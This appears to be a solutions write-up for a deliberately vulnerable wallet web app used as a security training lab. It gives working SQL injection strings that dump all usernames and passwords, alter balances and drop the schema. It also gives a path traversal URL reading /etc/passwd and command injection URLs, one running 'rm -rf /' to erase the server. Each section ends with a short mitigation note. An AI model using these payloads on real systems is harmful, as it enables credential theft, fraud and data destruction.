# SQL Injection 

**Challenge 1:** Identify fields vulnerable to SQL injection.  
**Solution:**  
* Sign up page – Username, password, email fields.  
* Sign in page -  Username, password fields.
* Transactions page – Comments.

**Challenge 2:** DBMS (postgresql, oracle etc) used by the app.  
**Solution:**  Refer screen recording in README.  
 
**Challenge 3:** Schema used for the app.  
**Solution:**  Refer screen recording in README. Refer the table below for the query string.  

**Challenge 4:** Tables in the app.  
**Solution:**  Refer screen recording in README. Refer the table below for the query string.  

**Challenge 5:** Username and password of all users.  
**Solution:**  Refer screen recording in README. Refer the table below for the query string.  

**Challenge 6:** Recharge your wallet with Rs. 100000 without using the wallet page.  
**Solution:**  Refer screen recording in README. Refer the table below for the query string.  

**Challenge 7:** Make the wallet balance of all users 0.  
**Solution:**  Refer screen recording in README. Refer the table below for the query string.  

**Challenge 8:** Delete all your transactions.  
**Solution:**  Refer screen recording in README. Refer the table below for the query string.  

**Challenge 9:** Drop all the tables.  
**Solution:**  Refer screen recording in README. Refer the table below for the query string.  

| Task no. | Page name        | Field name           | Value                                                                                                                    |
|----------|------------------|----------------------|--------------------------------------------------------------------------------------------------------------------------|
| 3        | Sign up page     | username             | user0', (SELECT GROUP_CONCAT(distinct(table_schema), ' ') FROM INFORMATION_SCHEMA.tables), 'pass') --                    |
| 4        | Sign up page     | username             | user1', (select GROUP_CONCAT(table_name, ' ') from information_schema.tables where table_schema = 'wallet'), 'pass') --  |
| 5        | Transaction page | Transaction comments | test' \|\| (SELECT GROUP_CONCAT(username, ' : ' , password) FROM user)) --                                               |
| 6        | Transaction page | Transaction comments | test'); update wallet set cash = 100000 where uid = (select id from user where username = 'Steve'); --                   |
| 7        | Transaction page | Transaction comments | test'); update wallet set cash = 0; --                                                                                   |
| 8        | Transaction page | Transaction comments | test'); delete from transactions where user = (select id from user where username = 'Steve'); --                         |
| 9        | Transaction page | Transaction comments | test'); drop schema wallet; --                                                                                           |

**Recommendation to protect against this vulnerability** - Parameterized queries.


# Web parameter tampering  

**Challenge 1:** Execute a transaction for an amount that is greater than your wallet balance.  
**Solution:** Refer screen recording in README.  

**Challenge 2:** Delete a card that does not belong to the current logged in user.   
**Solution:** Refer screen recording in README.  

**Recommendation to protect against this vulnerability** - Implement validations in the backend.  

# Path traversal 

**Challenge 1:** Gain access to 'etc/passwd' file in the server.  
**Solution:** Refer screen recording in README.  
````````````````
http://localhost:8082/wallet/LoadImage?filename=../../../../../../etc/passwd
````````````````
**Recommendation to protect against this vulnerability** - Do not use file system APIs to load static page resources. Use ‘chroot’ to restrict file access.  

# Command Injection 

**Challenge 1:** Execute a Linux command to list files in root directory.  
**Solution:** Refer screen recording in README.  
````````````
http://localhost:8082/wallet/transAnalyze?periodicity=monthly%20;%20cd%20/%20;%20ls
````````````

**Challenge 2:** Delete the entire server file system using command injection.  
**Solution:** Refer screen recording in README.  
````````````````
http://localhost:8082/wallet/transAnalyze?periodicity=monthly%20;%20rm%20--no-preserve-root%20-rf%20/
````````````````

**Recommendation to protect against this vulnerability** - Scrub all input for malicious characters using a whitelist of allowed characters.
